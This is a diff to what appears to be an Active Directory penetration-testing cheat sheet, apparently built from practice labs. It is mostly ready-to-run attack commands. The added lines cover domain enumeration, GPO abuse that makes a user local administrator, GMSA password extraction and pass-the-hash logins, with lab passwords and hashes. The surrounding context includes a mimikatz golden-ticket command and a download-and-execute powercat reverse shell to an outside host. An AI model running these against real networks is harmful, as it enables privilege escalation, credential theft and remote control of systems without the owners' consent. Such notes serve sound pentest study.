@@ -7,6 +7,8 @@ https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a \
 https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet \
 https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory \
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md
+https://wadcoms.github.io/
+
 
 ```Shell
 rdate -n 10.10.10.52
@@ -17,9 +19,25 @@ rdate -n 10.10.10.52
 ### RPC
 https://www.hackingarticles.in/active-directory-enumeration-rpcclient/
 
+Get-ADGroupMember -Identity 'Web Admins' -Recursive
+
 ### Active Directory Enumeration: BloodHound
 https://www.hackingarticles.in/active-directory-enumeration-bloodhound/
 https://swepstopia.com/bloodhound-enumeration/
+
+
+Get-ADDomain
+(Get-ADDomain).DomainSID
+Get-ADDefaultDomainPasswordPolicy
+Get-ADForest -Identity heist.offsec
+Get-ADGroup -Filter "*" | Select 'Name
+Get-ADGroupMember -Identity 'Web Admins' -Recursive
+Get-ADPrincipalGroupMembership -Identity enox
+
+Get-ADuser -Filter * -Properties * | select SamAccountName
+Get-ADuser -Filter * -Properties * | select servicePrincipalName
+Get-ADUser -Filter * -Properties * | Where {$_.ServicePrincipalName -ne $null} | Select 'Name','ServicePrincipalName'
+
 
 
 ### Enumerate logged-in and sessions users
@@ -123,7 +141,6 @@ ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.120.108" "(objectcla
 ldapsearch -x -h 192.168.240.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName 
 ldapsearch -x -h 192.168.240.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep description
 ```
-
  
 ## attacks
 
@@ -321,6 +338,25 @@ mimikatz # kerberos::list
 mimikatz # kerberos::golden /user:sec /domain:corporate.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorporateWebServer.corporate.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
 ```
 
+### Group Policy Object Enumeration
+```console
+evil-winrm -i 192.168.120.116 -u anirudh -p "SecureHM" -s .
+*Evil-WinRM* PS C:\Users\anirudh\Documents> PowerView.ps1
+*Evil-WinRM* PS C:\Users\anirudh\Documents> Get-NetGPO
+*Evil-WinRM* PS C:\Users\anirudh\Documents> Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9 -TargetType User -TargetName anirudh    #GpoEditDeleteModifySecurity
+*Evil-WinRM* PS C:\Users\anirudh\Documents> upload /home/kali/SharpGPOAbuse.exe
+*Evil-WinRM* PS C:\Users\anirudh\Documents> ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
+*Evil-WinRM* PS C:\Users\anirudh\Documents> gpupdate /force
+*Evil-WinRM* PS C:\Users\anirudh\Documents> net localgroup Administrators
+python3 /usr/share/doc/python3-impacket/examples/psexec.py vault.offsec/anirudh:SecureHM@192.168.120.116
+```
+```console
+Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "VAULT\anirudh"}
+Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "VAULT\anirudh"}
+**Get New Powerview 3.0
+New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators anirudh /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
+```
+
 ### LAPS
 https://www.hackingarticles.in/credential-dumpinglaps/
 ```console
@@ -332,6 +368,26 @@ Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn
 Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds
 ```
 
+### Group Managed Service Accounts (GMSA)
+https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe
+https://stealthbits.com/blog/securing-gmsa-passwords/
+```console
+Get-ADServiceAccount -Filter *
+Get-ADServiceAccount -Identity 'svc_apache$' -Properties * | Select PrincipalsAllowedToRetrieveManagedPassword    # Show Groups with permiss
+Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'
+```
+```console
+$gmsa = Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'
+$mp = $gmsa.'msDS-ManagedPassword'
+$mp
+```
+```console
+Evil-WinRM* PS C:\Windows\temp> upload /opt/tools/GMSAPasswordReader.exe
+./GMSAPasswordReader.exe --accountname svc_apache
+```
+```console
+evil-winrm -i 192.168.102.165 -u svc_apache$ -H 78BC82C952449150A12AD60E870A2BE4
+```
 
 ### Domain Persistence: Golden Certificate Attack
 https://www.hackingarticles.in/domain-persistence-golden-certificate-attack/
@@ -377,6 +433,7 @@ https://book.hacktricks.xyz/windows/active-directory-methodology/printers-spoole
 
 #### Net Zero Logon CVE-2020-1472
 https://swepstopia.com/net-zero-logon/
+https://github.com/dirkjanm/CVE-2020-1472
 
 #### log4j CVE-2021-44228
 https://swepstopia.com/log4j-cve-2021-44228/ \
@@ -395,9 +452,12 @@ https://mpgn.gitbook.io/crackmapexec/getting-started/using-kerberos
 crackmapexec smb 192.168.100.0/24 
 ```
 
-
-
 ## Utils
+
+### WinRM
+```Shell
+evil-winrm -i 192.168.227.165 -u enox -p california 
+```
 
 ### RCE Impaket
 https://www.hackingarticles.in/remote-code-execution-using-impacket/
@@ -416,6 +476,8 @@ https://www.hackingarticles.in/lateral-moment-on-active-directory-crackmapexec/
 powershell -exec Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.100.17/powercat.ps1');powercat -c 192.168.100.17 -p 443 -e cmd"
 ```
 https://www.hackingarticles.in/powercat-for-pentester/
+https://github.com/PowerShellMafia/PowerSploit
+
 
 #PowerShell
 https://sp00ks-git.github.io/posts/CLM-Bypass/ \
